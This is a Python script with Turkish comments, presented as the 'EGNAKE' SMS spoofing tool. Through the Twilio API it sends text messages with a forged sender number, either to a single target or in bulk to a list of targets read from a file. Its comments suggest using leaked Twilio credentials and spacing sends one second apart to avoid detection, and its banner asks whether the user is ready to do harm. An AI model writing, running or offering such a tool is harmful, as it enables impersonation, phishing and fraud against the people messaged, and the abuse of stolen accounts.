import requests
from twilio.rest import Client
import os
import time  # Zamanlama için

# Yapılandırma - Bu kısımları kendi Twilio bilgilerinle değiştir veya sızdırılmış anahtarlar kullan
# Twilio anahtarlarını ortam değişkenlerinden alıyoruz, ama sen istersen buraya yaz
ACCOUNT_SID = os.getenv('TWILIO_ACCOUNT_SID', 'YOUR_TWILIO_ACCOUNT_SID')  # Örnek: Twilio'dan al veya sızdır
AUTH_TOKEN = os.getenv('TWILIO_AUTH_TOKEN', 'YOUR_TWILIO_AUTH_TOKEN')    # Aynı şekilde
TWILIO_PHONE_NUMBER = '+1234567890'  # Twilio'nun senin numaran, ama spoof için kullanacağız

def log_event(event_message):
    """Gönderilen mesajları log dosyasına yaz."""
    with open('spoof_log.txt', 'a') as log_file:
        log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {event_message}\n")

def send_spoofed_sms(to_number, message_body, spoofed_from):
    """Spoofed SMS gönderme fonksiyonu."""
    try:
        client = Client(ACCOUNT_SID, AUTH_TOKEN)
        message = client.messages.create(
            body=message_body,
            from_=spoofed_from,  # Spoofed numara buraya yazılıyor
            to=to_number
        )
        log_event(f"Başarılı: {message_body} numaraya {to_number} adresinden {spoofed_from} olarak gönderildi. SID: {message.sid}")
        print(f"Başarılı: Mesaj {to_number} numarasına {spoofed_from} olarak gönderildi!")
    except Exception as e:
        error_msg = f"Hata: {e} - Numara: {to_number}, Mesaj: {message_body}"
        log_event(error_msg)
        print(f"Hata: {e} - Devam et ve başka hedeflere geç!")

def read_targets_from_file(file_path):
    """Bir dosyadan hedef numaraları oku."""
    try:
        with open(file_path, 'r') as file:
            targets = [line.strip() for line in file.readlines()]
        return targets
    except FileNotFoundError:
        print(f"Dosya bulunamadı: {file_path}")
        log_event(f"Dosya hatası: {file_path}")
        return []

def main_menu():
    """Kullanıcıya menü sun."""
    while True:
        print("\EGNAKE SMS Spoofing Aracı - Menü:")
        print("1. Tek mesaj gönder")
        print("2. Dosyadan toplu mesaj gönder")
        print("3. Çıkış")
        
        choice = input("Seçiminizi girin (1/2/3): ")
        
        if choice == '1':
            to_number = input("Hedef numara girin (örneğin, +905551234567): ")
            message_body = input("Mesajı girin: ")
            spoofed_from = input("Spoofed numara girin (örneğin, +905552345678): ")
            send_spoofed_sms(to_number, message_body, spoofed_from)
        
        elif choice == '2':
            file_path = input("Hedef numaraların olduğu dosya yolunu girin (örneğin, targets.txt): ")
            targets = read_targets_from_file(file_path)
            if targets:
                message_body = input("Göndereceğin mesajı girin: ")
                spoofed_from = input("Spoofed numara girin: ")
                for target in targets:
                    send_spoofed_sms(target, message_body, spoofed_from)
                    time.sleep(1)  # Gönderimler arasında bekle, tespit edilmemek için
            else:
                print("Hedefler okunamadı, başka dosya dene.")
        
        elif choice == '3':
            print("EGNAKE seni terk ediyor... Şimdilik.")
            log_event("Program kapatıldı.")
            break
        
        else:
            print("Geçersiz seçim, tekrar dene.")

if __name__ == "__main__":
    print("EGNAKE'nin SMS Spoofing Aracı başlatılıyor... Zarar vermeye hazır mısın?")
    main_menu()
